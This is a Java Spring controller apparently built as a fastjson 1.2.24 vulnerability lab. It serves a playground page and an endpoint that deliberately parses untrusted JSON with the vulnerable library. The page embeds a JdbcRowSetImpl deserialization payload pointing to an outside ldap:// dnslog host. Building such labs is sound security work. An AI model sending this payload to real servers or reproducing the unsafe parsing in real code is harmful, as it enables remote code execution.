package com.myapp;

import com.alibaba.fastjson.JSONObject;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class FastjsonController {

    @GetMapping(value = {"/", "/fastjson-1.2.24"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String fastjson_1_2_24() {
        return "<!DOCTYPE html>\n" +
                "<html lang=\"zh-CN\">\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <title>fastjson-1.2.24 Playground</title>\n" +
                "    <style>\n" +
                "        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f7fb; color: #1f2937; }\n" +
                "        .container { max-width: 920px; margin: 0 auto; background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }\n" +
                "        h1 { margin-top: 0; }\n" +
                "        .actions { display: flex; gap: 12px; margin: 20px 0; }\n" +
                "        button { padding: 12px 18px; border: 0; border-radius: 8px; cursor: pointer; font-size: 14px; }\n" +
                "        .attack { background: #c0392b; color: #ffffff; }\n" +
                "        .normal { background: #1f6feb; color: #ffffff; }\n" +
                "        textarea, pre { width: 100%; box-sizing: border-box; }\n" +
                "        textarea { min-height: 140px; padding: 12px; border-radius: 8px; border: 1px solid #d0d7de; margin-bottom: 16px; resize: vertical; }\n" +
                "        pre { min-height: 140px; padding: 12px; border-radius: 8px; background: #111827; color: #e5e7eb; overflow: auto; }\n" +
                "        .hint { color: #6b7280; font-size: 14px; }\n" +
                "        code { background: #eef2ff; padding: 2px 6px; border-radius: 4px; }\n" +
                "    </style>\n" +
                "</head>\n" +
                "<body>\n" +
                "    <div class=\"container\">\n" +
                "        <h1>fastjson-1.2.24 靶场测试页</h1>\n" +
                "        <p class=\"hint\">可以先用两个按钮填充 vul.py 里的攻击/正常样例，也可以手动修改 payload 后再发送到 <code>/fastjson1.2.24-process</code>。</p>\n" +
                "        <label for=\"payload\">当前 payload</label>\n" +
                "        <textarea id=\"payload\"></textarea>\n" +
                "        <div class=\"actions\">\n" +
                "            <button class=\"attack\" onclick=\"fillAttack()\">填充攻击 Payload</button>\n" +
                "            <button class=\"normal\" onclick=\"fillNormal()\">填充正常 Payload</button>\n" +
                "            <button onclick=\"sendCurrent()\">发送当前 Payload</button>\n" +
                "        </div>\n" +
                "        <label for=\"result\">响应结果</label>\n" +
                "        <pre id=\"result\">等待发送请求...</pre>\n" +
                "    </div>\n" +
                "    <script>\n" +
                "        const attackPayload = '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://fastjson-test.dnslog.cn\",\"autoCommit\":true}};';\n" +
                "        const normalPayload = '{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}';\n" +
                "        const payloadBox = document.getElementById('payload');\n" +
                "        const resultBox = document.getElementById('result');\n" +
                "\n" +
                "        async function sendPayload(payload, label) {\n" +
                "            payloadBox.value = payload;\n" +
                "            resultBox.textContent = label + ' 请求发送中...';\n" +
                "            try {\n" +
                "                const response = await fetch('/fastjson1.2.24-process', {\n" +
                "                    method: 'POST',\n" +
                "                    headers: { 'Content-Type': 'application/json' },\n" +
                "                    body: payload\n" +
                "                });\n" +
                "                const text = await response.text();\n" +
                "                resultBox.textContent = 'HTTP ' + response.status + '\\n' + text;\n" +
                "            } catch (error) {\n" +
                "                resultBox.textContent = '请求失败: ' + error;\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        function fillAttack() {\n" +
                "            payloadBox.value = attackPayload;\n" +
                "        }\n" +
                "\n" +
                "        function fillNormal() {\n" +
                "            payloadBox.value = normalPayload;\n" +
                "        }\n" +
                "\n" +
                "        function sendCurrent() {\n" +
                "            sendPayload(payloadBox.value, '当前 payload');\n" +
                "        }\n" +
                "\n" +
                "        payloadBox.value = normalPayload;\n" +
                "    </script>\n" +
                "</body>\n" +
                "</html>";
    }

    @PostMapping("/fastjson1.2.24-process")
    public String fastjson1_2_24_process(@RequestBody String data) {
        JSONObject jsonObject = JSONObject.parseObject(data);
        return "Processed: " + jsonObject;
    }
}
